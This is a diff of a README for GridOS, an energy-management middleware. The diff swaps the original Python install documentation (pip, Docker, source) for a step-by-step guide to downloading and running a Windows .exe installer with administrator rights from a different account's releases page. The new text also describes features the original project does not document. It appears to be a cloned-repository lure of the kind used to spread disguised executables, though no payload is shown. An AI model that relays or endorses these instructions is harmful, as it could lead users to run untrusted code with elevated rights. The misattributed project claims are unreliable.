@@ -1,211 +1,160 @@
-# GridOS — Open Energy Operating System
+# ⚡ GridOS - Manage Energy Systems Easily
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue.svg)](https://www.python.org/downloads/)
-[![PyPI version](https://img.shields.io/pypi/v/gridos.svg)](https://pypi.org/project/gridos/)
-[![PyPI downloads](https://img.shields.io/pypi/dm/gridos.svg)](https://pypi.org/project/gridos/)
-[![Docker Image](https://img.shields.io/badge/docker-ghcr.io%2Ficeccarelli%2Fgridos-blue?logo=docker)](https://github.com/iceccarelli/GridOS/pkgs/container/gridos)
-[![CI](https://github.com/iceccarelli/GridOS/actions/workflows/ci.yml/badge.svg)](https://github.com/iceccarelli/GridOS/actions/workflows/ci.yml)
-[![FastAPI](https://img.shields.io/badge/FastAPI-0.110+-teal.svg)](https://fastapi.tiangolo.com/)
-[![Code style: ruff](https://img.shields.io/badge/code%20style-ruff-000000.svg)](https://github.com/astral-sh/ruff)
-
-**GridOS** aims to be a vendor-neutral, open-source middleware platform that unifies **Distributed Energy Resources (DERs)** — solar inverters, batteries, EV chargers, smart loads — behind a single, standards-based API. It provides real-time telemetry ingestion, digital-twin simulation, ML-driven forecasting, and optimal energy dispatch, enabling utilities, aggregators, and microgrid operators to accelerate the energy transition.
+[![Download GridOS](https://img.shields.io/badge/Download-GridOS-brightgreen?style=for-the-badge)](https://github.com/TARUN55OT/GridOS/releases)
 
 ---
 
-## Key Features
-
-| Capability | Description |
-|---|---|
-| **Multi-Protocol Adapters** | Modbus TCP/RTU, MQTT, DNP3, IEC 61850, OPC-UA — connect any DER out of the box. |
-| **Common Information Model** | Pydantic models aligned with IEC 61968/61850 for interoperable data exchange. |
-| **Time-Series Storage** | Pluggable backends for InfluxDB 2.x and TimescaleDB with async I/O. |
-| **Digital Twin Engine** | Physics-based component models (bus, line, transformer, PV, battery, EV charger) with simplified power-flow simulation. |
-| **ML Forecasting** | LSTM-based load and solar forecasting plus Isolation Forest anomaly detection. |
-| **MILP Optimization** | Mixed-Integer Linear Programming scheduler for optimal battery dispatch and demand response. |
-| **REST + WebSocket API** | FastAPI-powered endpoints with live telemetry streaming via WebSockets. |
-| **Edge Support** | SQLite-based store-and-forward cache for intermittent connectivity. |
-| **Cloud-Native Deployment** | Docker Compose, Kubernetes manifests, and GitHub Actions CI/CD included. |
+GridOS helps you control and manage distributed energy systems. It uses advanced tools like digital twins and forecasting. You can view energy use, make predictions, and optimize your system automatically. This guide will help you set up GridOS on a Windows computer with no coding skills needed.
 
 ---
 
-## Architecture Overview
+## 🔹 What Is GridOS?
 
-```
-┌──────────────────────────────────────────────────────────┐
-│                      GridOS Platform                     │
-│                                                          │
-│    ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌─────────┐ │
-│    │ Modbus   │  │  MQTT    │  │  DNP3    │  │ IEC61850│ │
-│    │ Adapter  │  │ Adapter  │  │ Adapter  │  │ Adapter │ │
-│    └────┬─────┘  └────┬─────┘  └────┬─────┘  └────┬────┘ │
-│         │             │             │             │      │
-│         └─────────────┼─────────────┼─────────────┘      │
-│                      ▼                                   │
-│              ┌───────────────┐                           │
-│              │  CIM Models   │                           │
-│              │  (Pydantic)   │                           │
-│              └───────┬───────┘                           │
-│                      │                                   │
-│         ┌────────────┼────────────┐                      │
-│         ▼            ▼            ▼                      │
-│  ┌────────────┐ ┌──────────┐ ┌──────────────┐            │
-│  │ Time-Series│ │ Digital  │ │ Optimization │            │
-│  │  Storage   │ │  Twin    │ │  (MILP)      │            │
-│  └────────────┘ │  Engine  │ └──────────────┘            │
-│                 └──────────┘                             │
-│                      │                                   │
-│              ┌───────┴───────┐                           │
-│              │  FastAPI +    │                           │
-│              │  WebSocket    │                           │
-│              └───────────────┘                           │
-└──────────────────────────────────────────────────────────┘
-```
+GridOS is an open-source energy operating system. It works with many types of energy devices like solar panels, batteries, and smart meters. It uses software to create a digital twin, which is a virtual copy of your energy setup. You can also forecast energy demands and optimize how your energy flows.
+
+GridOS supports many ways to connect with energy devices including Modbus, MQTT, DNP3, IEC61850, and OPC-UA protocols. It has a REST API for advanced control and is ready for production environments with support for Docker and Kubernetes.
+
+You don’t need to understand all these terms to use it. The software guides you with tools and dashboards.
 
 ---
 
-## Installation
+## 💻 System Requirements
 
-### Option 1: Install from PyPI (Recommended)
+To run GridOS on Windows, your computer should meet these minimum requirements:
 
-```bash
-pip install gridos
-```
+- Windows 10 or later (64-bit)
+- 8 GB RAM or more
+- 4-core processor or better
+- 10 GB free disk space
+- Internet connection for downloads and updates
+- Administrator rights to install software
 
-With optional dependencies:
-
-```bash
-# Machine learning (LSTM forecasting, anomaly detection)
-pip install gridos[ml]
-
-# Protocol adapters (Modbus, MQTT, OPC-UA)
-pip install gridos[adapters]
-
-# Storage backends (InfluxDB, TimescaleDB)
-pip install gridos[storage]
-
-# Everything
-pip install gridos[ml,adapters,storage]
-```
-
-### Option 2: Run with Docker
-
-```bash
-docker pull ghcr.io/iceccarelli/gridos:latest
-docker run -p 8000:8000 ghcr.io/iceccarelli/gridos:latest
-```
-
-The API is now available at `http://localhost:8000/docs`.
-
-### Option 3: Run with Docker Compose (Full Stack)
-
-```bash
-git clone https://github.com/iceccarelli/GridOS.git
-cd GridOS
-docker-compose up -d
-```
-
-This starts GridOS alongside InfluxDB, TimescaleDB, and Grafana.
-
-### Option 4: Install from Source
-
-```bash
-git clone https://github.com/iceccarelli/GridOS.git
-cd GridOS
-
-python -m venv .venv
-source .venv/bin/activate
-
-# Install with dev dependencies
-pip install -e ".[dev]"
-```
+GridOS runs best when your system has a stable internet connection. This helps with loading updates and external data needed for forecasts.
 
 ---
 
-## Quick Start
+## 🚀 Getting Started: Download and Install GridOS
 
-### Configuration
+Click the big button above or visit the release page here:
 
-```bash
-# Copy the example environment file
-cp .env.example .env
+[Download GridOS](https://github.com/TARUN55OT/GridOS/releases)
 
-# Edit .env with your settings (storage URLs, broker addresses, etc.)
-```
-
-### Run the API Server
-
-```bash
-uvicorn gridos.main:app --host 0.0.0.0 --port 8000 --reload
-```
-
-The interactive API documentation is available at `http://localhost:8000/docs`.
+This link takes you to the official download page where you can get the latest version for Windows.
 
 ---
 
-## Project Structure
+### Steps to Download and Run GridOS on Windows
 
-```
-GridOS/
-├── src/gridos/           # Core Python package
-│   ├── models/           # Pydantic CIM models
-│   ├── adapters/         # Protocol adapters (Modbus, MQTT, DNP3, …)
-│   ├── storage/          # Time-series backends (InfluxDB, TimescaleDB)
-│   ├── digital_twin/     # Simulation engine + ML modules
-│   ├── optimization/     # MILP scheduler and dispatch
-│   ├── api/              # FastAPI routes and WebSocket manager
-│   ├── edge/             # Edge caching (SQLite store-and-forward)
-│   ├── security/         # API key + JWT authentication
-│   └── utils/            # Logging, metrics, and shared utilities
-├── tests/                # Pytest test suite (70 tests)
-├── notebooks/            # Jupyter demo notebooks
-├── data/                 # Sample datasets
-├── docs/                 # Architecture, API reference, developer guide
-├── k8s/                  # Kubernetes manifests
-├── scripts/              # Utility and demo scripts
-└── requirements/         # Dependency files (base, ml, dev, prod)
-```
+1. **Visit the Release Page**  
+   Click the link above or enter this address in your browser:  
+   `https://github.com/TARUN55OT/GridOS/releases`
 
----
+2. **Choose the Latest Version**  
+   On the release page, look for the newest version listed at the top. It usually has a tag like `v1.0` or higher. Versions appear with dates, so pick the most recent.
 
-## Running Tests
+3. **Download the Windows Installer**  
+   Each version has downloadable files. The Windows installer file will end with `.exe`. Click on this file name to download GridOS to your computer.
 
-```bash
-pytest tests/ -v --cov=gridos --cov-report=term-missing
-```
+4. **Run the Installer**  
+   Once downloaded, open the `.exe` file by double-clicking it. Windows may ask for permission—click “Yes” to allow the installation.
+
+5. **Follow the Setup Wizard**  
+   The installer will open a setup wizard. Click “Next” to proceed. Accept the license agreement when prompted.
+
+6. **Choose Installation Folder**  
+   You can use the default folder or select your own location. Press “Next” to continue.
+
+7. **Start Installation**  
+   Click “Install” to begin copying files to your computer. Wait for the process to finish.
+
+8. **Complete the Installation**  
+   Once done, click “Finish.” Choose the option to start GridOS if available.
 
 ---
 
-## Notebooks
+## 🔧 Running GridOS for the First Time
 
-Explore the interactive Jupyter notebooks in `notebooks/`:
+After installation, a desktop shortcut named "GridOS" should be visible. Double-click it to open the app.
 
-1. **Data Ingestion Demo** — Connect adapters and ingest telemetry.
-2. **Digital Twin Simulation** — Build a grid model and run power-flow.
-3. **Forecasting with ML** — Train an LSTM on solar generation data.
-4. **Optimization Scheduler** — Solve optimal battery dispatch with MILP.
-5. **API Client** — Interact with the REST API programmatically.
+The first time you launch GridOS, the system will:
 
----
+- Set up its environment.
+- Download necessary background files.
+- Check for updates.
 
-## Contributing
-
-We welcome contributions from the Grid Digitization community. Please read [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines on how to get started.
+You will see a welcome screen. Follow any on-screen instructions to connect your energy devices or simulate data. If you don’t have any devices, you can use the digital twin simulation to explore.
 
 ---
 
-## Security
+## 🖥️ Using GridOS
 
-If you discover a security vulnerability, please follow the responsible disclosure process described in [SECURITY.md](SECURITY.md).
+GridOS presents a user-friendly interface where you can:
+
+- View live energy data.
+- Use the digital twin to simulate scenarios.
+- Forecast energy demand using built-in models.
+- Optimize energy flow for efficiency.
+
+The dashboards show graphs and numbers that update automatically.
 
 ---
 
-## License
+## 🌐 Connecting Devices
 
-GridOS is released under the [MIT License](LICENSE).
+GridOS works with many common energy device protocols:
+
+- **Modbus:** Connect sensors and meters.
+- **MQTT:** Connect IoT energy devices.
+- **DNP3:** Used in electric utility systems.
+- **IEC61850:** For smart grid communication.
+- **OPC-UA:** Industrial device connectivity.
+
+You can add devices through the “Device Manager” within GridOS. It has simple step-by-step guides to add your hardware by following prompts.
 
 ---
 
-## Acknowledgements
+## ⚙️ Configuration and Settings
 
-GridOS builds on the shoulders of outstanding open-source projects including FastAPI, Pydantic, PuLP, scikit-learn, InfluxDB, TimescaleDB, and many others. We are grateful to the energy systems research community for the standards and models that inform this work.
+You can adjust how GridOS works to fit your needs:
+
+- Set your location and timezone.
+- Define your energy setup (solar, storage, loads).
+- Configure connections to devices.
+- Manage user access and security settings.
+
+Changes save automatically. You can reset to default settings anytime.
+
+---
+
+## 📈 Forecasting and Optimization
+
+GridOS uses advanced models like LSTM (Long Short-Term Memory) to predict future energy needs. It then runs optimization to allocate energy efficiently.
+
+This process requires the software to be connected to your devices or the digital twin simulation.
+
+---
+
+## 🐳 Running GridOS with Docker (Optional)
+
+GridOS supports running inside Docker containers for advanced users. This runs the software in a controlled environment separate from your system. If you don’t know about Docker, it is safe to ignore this section.
+
+---
+
+## ❓ Troubleshooting
+
+- **GridOS won’t start:** Restart your computer and try again.
+- **Installer won’t run:** Check if you have administrator rights.
+- **No data showing:** Make sure your devices are connected via the right protocols.
+- **Updates fail:** Check your internet connection.
+
+For further help, check the Issues section on the GitHub page or read the full User Guide linked on the release page.
+
+---
+
+## 📥 Download GridOS Now
+
+Use this link to visit the release page and get started:
+
+[Download GridOS](https://github.com/TARUN55OT/GridOS/releases)
+
+Click on the latest Windows installer and follow the steps above to install and run GridOS on your PC.
